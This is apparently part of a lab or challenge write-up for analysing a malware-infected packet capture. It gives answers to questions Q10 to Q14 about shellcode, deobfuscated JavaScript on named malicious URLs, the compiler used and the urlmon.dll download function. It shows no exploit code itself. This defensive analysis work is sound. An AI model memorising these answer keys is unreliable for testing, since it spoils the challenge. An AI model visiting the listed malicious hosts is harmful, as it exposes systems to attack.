## `Q10` What is the name of the function that hosted the shellcode relevant to '`http://sploitme.com.cn/fg/load.php?e=3`'?

![](/assets/img/Pasted image 20240809174031.png)

-> Answer: `aolwinamp`

## `Q11` Deobfuscate the JS at '`shop.honeynet.sg/catalog/`' and provide the value of the '`click`' parameter in the resulted URL.

- See JS deobfuscation above around packet `449`.

![](/assets/img/Pasted image 20240809174430.png)

-> Answer: `84c090bd86`

## `Q12` Deobfuscate the JS at '`rapidshare.com.eyu32.ru/login.php`' and provide the value of the '`click`' parameter in the resulted URL.

- See deobfuscation on around `packet 41`.

![](/assets/img/Pasted image 20240809174538.png)

-> Answer: `3feb5a6b2f`

## `Q13` What was the version of '`mingw-gcc`' that compiled the malware?

![](/assets/img/Pasted image 20240807183359.png)

-> Answer: `3.4.5`

## `Q14` The shellcode used a native function inside '`urlmon.dll`' to download files from the internet to the compromised host. What is the name of the function?

- You can trace back the packet range/stream on this one above.

![](/assets/img/Pasted image 20240809174658.png)

-> Answer: `UrlDownloadToFile`

